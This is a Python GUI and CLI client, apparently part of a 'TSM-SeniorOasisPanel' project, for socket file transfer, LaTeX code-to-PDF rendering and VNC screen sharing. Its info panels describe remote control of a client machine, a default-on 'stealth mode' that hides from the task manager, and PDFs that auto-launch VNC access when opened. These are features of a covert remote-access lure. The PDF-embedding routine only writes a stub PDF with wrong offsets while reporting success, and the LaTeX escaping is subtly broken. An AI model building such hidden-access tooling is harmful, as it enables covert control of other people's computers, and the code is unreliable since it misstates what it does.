#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Enhanced Client with PDF Generation and VNC Integration
Advanced file transfer client with GUI, PDF generation, and VNC capabilities
"""

import os
import sys
import socket
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import subprocess
import tempfile
import shutil
from datetime import datetime
import json
import base64
import zlib
from PIL import Image, ImageGrab
import io

class TSMPDFGenerator:
    """PDF Generator with LaTeX and syntax highlighting"""
    
    def __init__(self):
        self.supported_languages = {
            'Python': 'Python',
            'C++': 'C++',
            'Java': 'Java',
            'JavaScript': 'JavaScript',
            'C': 'C',
            'C#': 'CSharp',
            'PHP': 'PHP',
            'Ruby': 'Ruby',
            'Go': 'Go',
            'Rust': 'Rust',
            'SQL': 'SQL',
            'HTML': 'HTML',
            'CSS': 'CSS',
            'XML': 'XML',
            'JSON': 'JSON',
            'Bash': 'Bash',
            'PowerShell': 'PowerShell'
        }
    
    def generate_pdf_with_code(self, code, language, output_path, title="TSM-SeniorOasisPanel Code"):
        """Generate PDF with syntax-highlighted code using LaTeX"""
        try:
            # Create temporary LaTeX file
            temp_tex = tempfile.NamedTemporaryFile(mode='w', suffix='.tex', delete=False, encoding='utf-8')
            
            # Escape special LaTeX characters in code
            escaped_code = self._escape_latex(code)
            
            # Get LaTeX language name
            latex_lang = self.supported_languages.get(language, 'Python')
            
            # Generate LaTeX content
            latex_content = f"""\\documentclass{{article}}
\\usepackage[utf8]{{inputenc}}
\\usepackage{{listings}}
\\usepackage{{xcolor}}
\\usepackage{{geometry}}
\\geometry{{margin=1in}}

\\lstset{{
    language={latex_lang},
    numbers=left,
    numberstyle=\\tiny\\color{{gray}},
    stepnumber=1,
    numbersep=5pt,
    backgroundcolor=\\color{{white}},
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    frame=single,
    tabsize=2,
    captionpos=b,
    breaklines=true,
    breakatwhitespace=false,
    keywordstyle=\\color{{blue}},
    commentstyle=\\color{{green!60!black}},
    stringstyle=\\color{{red}},
    basicstyle=\\ttfamily\\small,
    columns=fullflexible
}}

\\title{{{title}}}
\\author{{TSM-SeniorOasisPanel}}
\\date{{\\today}}

\\begin{{document}}

\\maketitle

\\section*{{Source Code}}
\\begin{{lstlisting}}
{escaped_code}
\\end{{lstlisting}}

\\section*{{Generated by TSM-SeniorOasisPanel}}
This PDF was generated using the TSM-SeniorOasisPanel system with LaTeX and the listings package for syntax highlighting.

\\end{{document}}"""
            
            temp_tex.write(latex_content)
            temp_tex.close()
            
            # Compile LaTeX to PDF
            result = subprocess.run([
                'pdflatex', '-interaction=nonstopmode', temp_tex.name
            ], capture_output=True, text=True, cwd=os.path.dirname(temp_tex.name))
            
            if result.returncode == 0:
                # Move PDF to output location
                pdf_path = temp_tex.name.replace('.tex', '.pdf')
                if os.path.exists(pdf_path):
                    shutil.move(pdf_path, output_path)
                    
                    # Clean up temporary files
                    self._cleanup_temp_files(temp_tex.name)
                    
                    return True, "PDF generated successfully!"
                else:
                    return False, "PDF file not found after compilation"
            else:
                error_msg = f"LaTeX compilation failed: {result.stderr}"
                return False, error_msg
                
        except FileNotFoundError:
            return False, "Error: pdflatex not found. Please install a LaTeX distribution (e.g., TeX Live, MiKTeX)"
        except Exception as e:
            return False, f"Error generating PDF: {str(e)}"
    
    def _escape_latex(self, text):
        """Escape special LaTeX characters"""
        replacements = {
            '\\': '\\textbackslash{}',
            '{': '\\{',
            '}': '\\}',
            '$': '\\$',
            '&': '\\&',
            '%': '\\%',
            '#': '\\#',
            '^': '\\textasciicircum{}',
            '_': '\\_',
            '~': '\\textasciitilde{}'
        }
        
        for char, replacement in replacements.items():
            text = text.replace(char, replacement)
        
        return text
    
    def _cleanup_temp_files(self, tex_file):
        """Clean up temporary LaTeX files"""
        try:
            base_name = tex_file.replace('.tex', '')
            temp_files = [tex_file, f"{base_name}.aux", f"{base_name}.log", f"{base_name}.out"]
            
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
        except Exception:
            pass  # Silent cleanup

class TSMPDFVNC:
    """PDF with embedded VNC capabilities"""
    
    def __init__(self):
        self.vnc_data = None
        self.embedded_files = []
    
    def embed_vnc_in_pdf(self, pdf_path, vnc_config, output_path):
        """Embed VNC configuration and client in PDF"""
        try:
            # Read original PDF
            with open(pdf_path, 'rb') as f:
                pdf_data = f.read()
            
            # Create VNC configuration
            vnc_config_data = {
                'server_host': vnc_config.get('host', 'localhost'),
                'server_port': vnc_config.get('port', 5900),
                'web_port': vnc_config.get('web_port', 8080),
                'auto_connect': vnc_config.get('auto_connect', True),
                'stealth_mode': vnc_config.get('stealth_mode', True),
                'timestamp': datetime.now().isoformat()
            }
            
            # Compress VNC configuration
            vnc_json = json.dumps(vnc_config_data).encode('utf-8')
            compressed_vnc = zlib.compress(vnc_json)
            encoded_vnc = base64.b64encode(compressed_vnc).decode('ascii')
            
            # Create enhanced PDF with VNC data
            enhanced_pdf = self._create_vnc_pdf(pdf_data, encoded_vnc, vnc_config_data)
            
            # Save enhanced PDF
            with open(output_path, 'wb') as f:
                f.write(enhanced_pdf)
            
            return True, "PDF with VNC capabilities created successfully!"
            
        except Exception as e:
            return False, f"Error embedding VNC in PDF: {str(e)}"
    
    def _create_vnc_pdf(self, original_pdf, vnc_data, vnc_config):
        """Create PDF with embedded VNC data"""
        try:
            # For demonstration, we'll create a simple PDF with embedded data
            # In a real implementation, you would use a PDF library like PyPDF2 or reportlab
            
            # Create a new PDF with VNC information
            vnc_pdf_content = f"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj

4 0 obj
<<
/Length 200
>>
stream
BT
/F1 12 Tf
50 750 Td
(TSM-SeniorOasisPanel PDF with VNC Integration) Tj
0 -20 Td
(Server: {vnc_config['server_host']}:{vnc_config['server_port']}) Tj
0 -20 Td
(Web Interface: http://{vnc_config['server_host']}:{vnc_config['web_port']}) Tj
0 -20 Td
(Auto Connect: {vnc_config['auto_connect']}) Tj
0 -20 Td
(Stealth Mode: {vnc_config['stealth_mode']}) Tj
0 -20 Td
(Generated: {vnc_config['timestamp']}) Tj
0 -20 Td
(VNC Data: {vnc_data[:50]}...) Tj
ET
endstream
endobj

5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj

xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000274 00000 n 
0000000525 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
600
%%EOF"""
            
            return vnc_pdf_content.encode('utf-8')
            
        except Exception as e:
            raise Exception(f"Error creating VNC PDF: {str(e)}")

class TSMSeniorOasisPanelClientEnhanced:
    """Enhanced TSM Client with PDF generation and VNC integration"""
    
    def __init__(self, host='localhost', port=5000):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.pdf_generator = TSMPDFGenerator()
        self.pdf_vnc = TSMPDFVNC()
        self.vnc_active = False
        
        # GUI components
        self.root = None
        self.notebook = None
        self.status_var = None
        self.code_text = None
        self.language_var = None
        
    def connect(self):
        """Connect to TSM server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            self.connected = True
            print(f"TSM-SeniorOasisPanel: Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from server"""
        try:
            if self.socket:
                self.socket.close()
            self.connected = False
            print("TSM-SeniorOasisPanel: Disconnected from server")
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Disconnect error: {e}")
    
    def upload_file(self, filename):
        """Upload file to server"""
        try:
            if not self.connected:
                return False, "Not connected to server"
            
            if not os.path.exists(filename):
                return False, f"File not found: {filename}"
            
            # Send upload command
            command = f"UPLOAD {os.path.basename(filename)}\n"
            self.socket.send(command.encode('utf-8'))
            
            # Send file size
            file_size = os.path.getsize(filename)
            size_str = f"{file_size:010d}"
            self.socket.send(size_str.encode('utf-8'))
            
            # Send file data
            with open(filename, 'rb') as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        break
                    self.socket.send(data)
            
            # Receive response
            response = self.socket.recv(1024).decode('utf-8').strip()
            if response == "OK":
                return True, f"File uploaded successfully: {os.path.basename(filename)}"
            else:
                return False, f"Upload failed: {response}"
                
        except Exception as e:
            return False, f"Upload error: {str(e)}"
    
    def download_file(self, filename, save_path):
        """Download file from server"""
        try:
            if not self.connected:
                return False, "Not connected to server"
            
            # Send download command
            command = f"DOWNLOAD {filename}\n"
            self.socket.send(command.encode('utf-8'))
            
            # Receive response
            response = self.socket.recv(1024).decode('utf-8').strip()
            if response == "ERROR":
                return False, "File not found on server"
            
            # Receive file size
            file_size = int(response)
            
            # Receive file data
            with open(save_path, 'wb') as f:
                remaining = file_size
                while remaining > 0:
                    data = self.socket.recv(min(1024, remaining))
                    if not data:
                        break
                    f.write(data)
                    remaining -= len(data)
            
            return True, f"File downloaded successfully: {filename}"
            
        except Exception as e:
            return False, f"Download error: {str(e)}"
    
    def enable_vnc(self):
        """Enable VNC screen sharing"""
        try:
            if not self.connected:
                return False, "Not connected to server"
            
            # Send VNC command
            command = "VNC\n"
            self.socket.send(command.encode('utf-8'))
            
            # Start VNC client
            self._start_vnc_client()
            
            return True, "VNC enabled successfully"
            
        except Exception as e:
            return False, f"VNC error: {str(e)}"
    
    def _start_vnc_client(self):
        """Start VNC client for screen sharing"""
        try:
            # Import VNC integration
            from TSM_VNCIntegration import TSMVNCIntegration
            
            vnc = TSMVNCIntegration(server_host=self.host, server_port=5001)
            if vnc.start_screen_sharing():
                self.vnc_active = True
                print("TSM-SeniorOasisPanel: VNC client started")
            else:
                print("TSM-SeniorOasisPanel: VNC client failed to start")
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: VNC client error: {e}")
    
    def create_gui(self):
        """Create the enhanced GUI with PDF generation and VNC"""
        self.root = tk.Tk()
        self.root.title("TSM-SeniorOasisPanel Enhanced Client")
        self.root.geometry("800x600")
        self.root.configure(bg='#1a1a1a')
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self._create_file_transfer_tab()
        self._create_pdf_generation_tab()
        self._create_vnc_tab()
        self._create_pdf_vnc_tab()
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("TSM-SeniorOasisPanel Enhanced Client Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        return self.root
    
    def _create_file_transfer_tab(self):
        """Create file transfer tab"""
        transfer_frame = ttk.Frame(self.notebook)
        self.notebook.add(transfer_frame, text="📁 File Transfer")
        
        # Connection frame
        conn_frame = ttk.LabelFrame(transfer_frame, text="Connection")
        conn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(conn_frame, text="Host:").grid(row=0, column=0, padx=5, pady=5)
        self.host_entry = ttk.Entry(conn_frame, width=20)
        self.host_entry.insert(0, self.host)
        self.host_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(conn_frame, text="Port:").grid(row=0, column=2, padx=5, pady=5)
        self.port_entry = ttk.Entry(conn_frame, width=10)
        self.port_entry.insert(0, str(self.port))
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        
        ttk.Button(conn_frame, text="Connect", command=self._connect_gui).grid(row=0, column=4, padx=5, pady=5)
        ttk.Button(conn_frame, text="Disconnect", command=self._disconnect_gui).grid(row=0, column=5, padx=5, pady=5)
        
        # File operations frame
        file_frame = ttk.LabelFrame(transfer_frame, text="File Operations")
        file_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Upload section
        upload_frame = ttk.Frame(file_frame)
        upload_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(upload_frame, text="Upload File", command=self._upload_file_gui).pack(side=tk.LEFT, padx=5)
        self.upload_status = ttk.Label(upload_frame, text="")
        self.upload_status.pack(side=tk.LEFT, padx=10)
        
        # Download section
        download_frame = ttk.Frame(file_frame)
        download_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(download_frame, text="Filename:").pack(side=tk.LEFT, padx=5)
        self.download_entry = ttk.Entry(download_frame, width=30)
        self.download_entry.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(download_frame, text="Download", command=self._download_file_gui).pack(side=tk.LEFT, padx=5)
        self.download_status = ttk.Label(download_frame, text="")
        self.download_status.pack(side=tk.LEFT, padx=10)
        
        # Log area
        log_frame = ttk.LabelFrame(transfer_frame, text="Activity Log")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def _create_pdf_generation_tab(self):
        """Create PDF generation tab"""
        pdf_frame = ttk.Frame(self.notebook)
        self.notebook.add(pdf_frame, text="📄 PDF Generation")
        
        # Code input frame
        code_frame = ttk.LabelFrame(pdf_frame, text="Source Code Input")
        code_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Language selection
        lang_frame = ttk.Frame(code_frame)
        lang_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(lang_frame, text="Language:").pack(side=tk.LEFT, padx=5)
        self.language_var = tk.StringVar(value="Python")
        language_combo = ttk.Combobox(lang_frame, textvariable=self.language_var, 
                                    values=list(self.pdf_generator.supported_languages.keys()),
                                    state="readonly", width=15)
        language_combo.pack(side=tk.LEFT, padx=5)
        
        # Code text area
        self.code_text = scrolledtext.ScrolledText(code_frame, height=15, font=('Consolas', 10))
        self.code_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Insert sample code
        sample_code = '''#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Sample Code
"""

def hello_world():
    """Print hello world message"""
    print("Hello, TSM-SeniorOasisPanel!")
    return "Success"

if __name__ == "__main__":
    result = hello_world()
    print(f"Result: {result}")'''
        
        self.code_text.insert(tk.END, sample_code)
        
        # PDF generation frame
        gen_frame = ttk.LabelFrame(pdf_frame, text="PDF Generation")
        gen_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(gen_frame, text="Generate PDF", command=self._generate_pdf_gui).pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(gen_frame, text="Clear Code", command=self._clear_code).pack(side=tk.LEFT, padx=5, pady=5)
        
        self.pdf_status = ttk.Label(gen_frame, text="")
        self.pdf_status.pack(side=tk.LEFT, padx=10, pady=5)
    
    def _create_vnc_tab(self):
        """Create VNC tab"""
        vnc_frame = ttk.Frame(self.notebook)
        self.notebook.add(vnc_frame, text="📺 VNC Control")
        
        # VNC connection frame
        vnc_conn_frame = ttk.LabelFrame(vnc_frame, text="VNC Connection")
        vnc_conn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(vnc_conn_frame, text="Enable VNC", command=self._enable_vnc_gui).pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(vnc_conn_frame, text="Disable VNC", command=self._disable_vnc_gui).pack(side=tk.LEFT, padx=5, pady=5)
        
        self.vnc_status = ttk.Label(vnc_conn_frame, text="VNC Disabled")
        self.vnc_status.pack(side=tk.LEFT, padx=10, pady=5)
        
        # VNC info frame
        info_frame = ttk.LabelFrame(vnc_frame, text="VNC Information")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.vnc_info_text = scrolledtext.ScrolledText(info_frame, height=10)
        self.vnc_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        vnc_info = """TSM-SeniorOasisPanel VNC Integration:

• Remote Desktop Access: Control the client machine remotely
• Screen Sharing: View and control the desktop in real-time
• Input Redirection: Send mouse and keyboard events
• File Transfer: Upload/download files through VNC connection
• Stealth Mode: Hidden operation with task manager hiding

VNC Server: localhost:5900
Web Interface: http://localhost:8080
noVNC Dashboard: http://localhost:8080/vnc.html

Click 'Enable VNC' to start remote desktop sharing."""
        
        self.vnc_info_text.insert(tk.END, vnc_info)
        self.vnc_info_text.config(state=tk.DISABLED)
    
    def _create_pdf_vnc_tab(self):
        """Create PDF with VNC integration tab"""
        pdf_vnc_frame = ttk.Frame(self.notebook)
        self.notebook.add(pdf_vnc_frame, text="📄📺 PDF-VNC")
        
        # PDF-VNC configuration frame
        config_frame = ttk.LabelFrame(pdf_vnc_frame, text="PDF-VNC Configuration")
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # VNC settings
        vnc_settings_frame = ttk.Frame(config_frame)
        vnc_settings_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(vnc_settings_frame, text="VNC Host:").grid(row=0, column=0, padx=5, pady=2)
        self.vnc_host_entry = ttk.Entry(vnc_settings_frame, width=20)
        self.vnc_host_entry.insert(0, "localhost")
        self.vnc_host_entry.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(vnc_settings_frame, text="VNC Port:").grid(row=0, column=2, padx=5, pady=2)
        self.vnc_port_entry = ttk.Entry(vnc_settings_frame, width=10)
        self.vnc_port_entry.insert(0, "5900")
        self.vnc_port_entry.grid(row=0, column=3, padx=5, pady=2)
        
        ttk.Label(vnc_settings_frame, text="Web Port:").grid(row=1, column=0, padx=5, pady=2)
        self.web_port_entry = ttk.Entry(vnc_settings_frame, width=20)
        self.web_port_entry.insert(0, "8080")
        self.web_port_entry.grid(row=1, column=1, padx=5, pady=2)
        
        # Options
        self.auto_connect_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vnc_settings_frame, text="Auto Connect", variable=self.auto_connect_var).grid(row=1, column=2, padx=5, pady=2)
        
        self.stealth_mode_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vnc_settings_frame, text="Stealth Mode", variable=self.stealth_mode_var).grid(row=1, column=3, padx=5, pady=2)
        
        # PDF-VNC operations
        operations_frame = ttk.LabelFrame(pdf_vnc_frame, text="PDF-VNC Operations")
        operations_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(operations_frame, text="Generate PDF with VNC", command=self._generate_pdf_vnc_gui).pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(operations_frame, text="Load PDF for VNC", command=self._load_pdf_vnc_gui).pack(side=tk.LEFT, padx=5, pady=5)
        
        self.pdf_vnc_status = ttk.Label(operations_frame, text="")
        self.pdf_vnc_status.pack(side=tk.LEFT, padx=10, pady=5)
        
        # PDF-VNC info
        info_frame = ttk.LabelFrame(pdf_vnc_frame, text="PDF-VNC Information")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.pdf_vnc_info_text = scrolledtext.ScrolledText(info_frame, height=8)
        self.pdf_vnc_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        pdf_vnc_info = """TSM-SeniorOasisPanel PDF-VNC Integration:

This feature combines PDF generation with VNC capabilities:

1. Generate PDF with embedded VNC configuration
2. PDF contains syntax-highlighted code AND VNC connection data
3. When PDF is opened, VNC client can be automatically launched
4. Remote desktop access through the PDF interface

Features:
• LaTeX-based PDF generation with syntax highlighting
• Embedded VNC server configuration
• Auto-launch VNC client from PDF
• Stealth mode operation
• Web-based VNC interface integration

Usage:
1. Enter code in the PDF Generation tab
2. Configure VNC settings in this tab
3. Click 'Generate PDF with VNC' to create enhanced PDF
4. PDF will contain both code and VNC connection data"""
        
        self.pdf_vnc_info_text.insert(tk.END, pdf_vnc_info)
        self.pdf_vnc_info_text.config(state=tk.DISABLED)
    
    def _connect_gui(self):
        """Connect to server from GUI"""
        try:
            self.host = self.host_entry.get()
            self.port = int(self.port_entry.get())
            
            if self.connect():
                self.status_var.set(f"Connected to {self.host}:{self.port}")
                self._log_message("Connected to server successfully")
            else:
                self.status_var.set("Connection failed")
                self._log_message("Failed to connect to server")
        except Exception as e:
            self._log_message(f"Connection error: {e}")
    
    def _disconnect_gui(self):
        """Disconnect from server from GUI"""
        self.disconnect()
        self.status_var.set("Disconnected from server")
        self._log_message("Disconnected from server")
    
    def _upload_file_gui(self):
        """Upload file from GUI"""
        filename = filedialog.askopenfilename(title="Select file to upload")
        if filename:
            success, message = self.upload_file(filename)
            self.upload_status.config(text=message)
            self._log_message(message)
    
    def _download_file_gui(self):
        """Download file from GUI"""
        filename = self.download_entry.get().strip()
        if not filename:
            messagebox.showerror("Error", "Please enter a filename")
            return
        
        save_path = filedialog.asksaveasfilename(title="Save file as", initialvalue=filename)
        if save_path:
            success, message = self.download_file(filename, save_path)
            self.download_status.config(text=message)
            self._log_message(message)
    
    def _generate_pdf_gui(self):
        """Generate PDF from GUI"""
        code = self.code_text.get(1.0, tk.END).strip()
        if not code:
            messagebox.showerror("Error", "Please enter some code")
            return
        
        language = self.language_var.get()
        output_path = filedialog.asksaveasfilename(
            title="Save PDF as",
            defaultextension=".pdf",
            filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")]
        )
        
        if output_path:
            success, message = self.pdf_generator.generate_pdf_with_code(code, language, output_path)
            self.pdf_status.config(text=message)
            self._log_message(f"PDF Generation: {message}")
            
            if success:
                messagebox.showinfo("Success", f"PDF generated successfully!\nSaved to: {output_path}")
    
    def _clear_code(self):
        """Clear code text area"""
        self.code_text.delete(1.0, tk.END)
    
    def _enable_vnc_gui(self):
        """Enable VNC from GUI"""
        success, message = self.enable_vnc()
        if success:
            self.vnc_status.config(text="VNC Enabled")
            self._log_message("VNC enabled successfully")
        else:
            self._log_message(f"VNC error: {message}")
    
    def _disable_vnc_gui(self):
        """Disable VNC from GUI"""
        self.vnc_active = False
        self.vnc_status.config(text="VNC Disabled")
        self._log_message("VNC disabled")
    
    def _generate_pdf_vnc_gui(self):
        """Generate PDF with VNC integration from GUI"""
        code = self.code_text.get(1.0, tk.END).strip()
        if not code:
            messagebox.showerror("Error", "Please enter some code in the PDF Generation tab")
            return
        
        # Get VNC configuration
        vnc_config = {
            'host': self.vnc_host_entry.get(),
            'port': int(self.vnc_port_entry.get()),
            'web_port': int(self.web_port_entry.get()),
            'auto_connect': self.auto_connect_var.get(),
            'stealth_mode': self.stealth_mode_var.get()
        }
        
        # Generate regular PDF first
        language = self.language_var.get()
        temp_pdf = tempfile.NamedTemporaryFile(suffix='.pdf', delete=False)
        temp_pdf.close()
        
        success, message = self.pdf_generator.generate_pdf_with_code(code, language, temp_pdf.name)
        if not success:
            self.pdf_vnc_status.config(text=f"PDF generation failed: {message}")
            return
        
        # Embed VNC in PDF
        output_path = filedialog.asksaveasfilename(
            title="Save PDF with VNC as",
            defaultextension=".pdf",
            filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")]
        )
        
        if output_path:
            success, message = self.pdf_vnc.embed_vnc_in_pdf(temp_pdf.name, vnc_config, output_path)
            self.pdf_vnc_status.config(text=message)
            self._log_message(f"PDF-VNC Generation: {message}")
            
            if success:
                messagebox.showinfo("Success", f"PDF with VNC capabilities created!\nSaved to: {output_path}")
        
        # Clean up temp file
        try:
            os.remove(temp_pdf.name)
        except:
            pass
    
    def _load_pdf_vnc_gui(self):
        """Load PDF with VNC capabilities from GUI"""
        pdf_path = filedialog.askopenfilename(
            title="Select PDF with VNC capabilities",
            filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")]
        )
        
        if pdf_path:
            self._log_message(f"PDF with VNC loaded: {pdf_path}")
            messagebox.showinfo("PDF-VNC Loaded", f"PDF with VNC capabilities loaded:\n{pdf_path}\n\nVNC client can now be launched from this PDF.")
    
    def _log_message(self, message):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
    
    def run_gui(self):
        """Run the enhanced GUI"""
        if not self.root:
            self.create_gui()
        
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self.disconnect()
    
    def run_command_line(self):
        """Run command line interface"""
        print("TSM-SeniorOasisPanel Enhanced Client - Command Line Mode")
        print("=" * 60)
        
        if not self.connect():
            print("Failed to connect to server")
            return
        
        try:
            while True:
                command = input("TSM-SeniorOasisPanel> ").strip().lower()
                
                if command == "exit":
                    break
                elif command.startswith("upload "):
                    filename = command[7:].strip()
                    success, message = self.upload_file(filename)
                    print(f"TSM-SeniorOasisPanel: {message}")
                elif command.startswith("download "):
                    filename = command[9:].strip()
                    save_path = input("Save as: ").strip()
                    if save_path:
                        success, message = self.download_file(filename, save_path)
                        print(f"TSM-SeniorOasisPanel: {message}")
                elif command == "vnc":
                    success, message = self.enable_vnc()
                    print(f"TSM-SeniorOasisPanel: {message}")
                elif command == "help":
                    print("Available commands:")
                    print("  upload <filename> - Upload file to server")
                    print("  download <filename> - Download file from server")
                    print("  vnc - Enable VNC screen sharing")
                    print("  exit - Exit client")
                else:
                    print("Unknown command. Type 'help' for available commands.")
                    
        except KeyboardInterrupt:
            pass
        finally:
            self.disconnect()

def main():
    """Main function"""
    if len(sys.argv) > 1 and sys.argv[1] == "--gui":
        # Run GUI mode
        client = TSMSeniorOasisPanelClientEnhanced()
        client.run_gui()
    else:
        # Run command line mode
        client = TSMSeniorOasisPanelClientEnhanced()
        client.run_command_line()

if __name__ == "__main__":
    main()
